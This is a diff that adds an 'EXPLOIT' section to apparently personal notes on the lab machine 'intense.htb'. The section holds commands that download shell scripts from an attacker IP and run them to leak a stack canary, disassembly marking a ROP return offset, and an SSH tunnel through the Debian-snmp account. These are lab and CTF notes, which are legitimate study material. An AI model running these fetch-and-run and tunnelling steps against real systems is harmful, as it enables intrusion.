@@ -306,3 +306,32 @@ objdump:  call write
 kinda nuts... go to c_files/local and see the sp.py
 rop is working to leak libc write and now we can calculate the offset
 now we only need to get gadgets in libc
+
+################################################################################
+EXPLOIT
+################################################################################
+wget http://10.10.14.33/canary_leaker.sh;chmod +x canary_leaker.sh
+./canary_leaker.sh | hexdump
+wget http://10.10.14.33/kun0.sh;chmod +x kun0.sh
+./kun0.sh | hexdump
+wget http://10.10.14.33/kun1.sh;chmod +x kun1.sh
+./kun1.sh | hexdump
+
+f4d:   89 c7                   mov    %eax,%edi
+f4f:   e8 b6 fb ff ff          callq  b0a <handle_client>
+f54:   bf 00 00 00 00          mov    $0x0,%edi
+^ we return here... now you know the offset
+f59:   e8 62 fa ff ff          callq  9c0 <exit@plt>
+f5e:   8b 85 38 ff ff ff       mov    -0xc8(%rbp),%eax
+f64:   89 c7                   mov    %eax,%edi
+
+set up ssh, nologin will not let you connect, so ask for shell-less (-N)
+ssh -N -L 1339:localhost:5001: Debian-snmp@intense.htb
+
+-N dont want a shell
+#ssh -N -L AAAAAA:BBBBBBB:CCCCCCC:DDDDDD@EEEEEEEEE                
+A:  my local port                                              
+B:  an ip accessed by the remote host of creds given as D@E    
+C:  port accessed by B                                         
+D:  user                                                       
+E:  remote ip target                                           
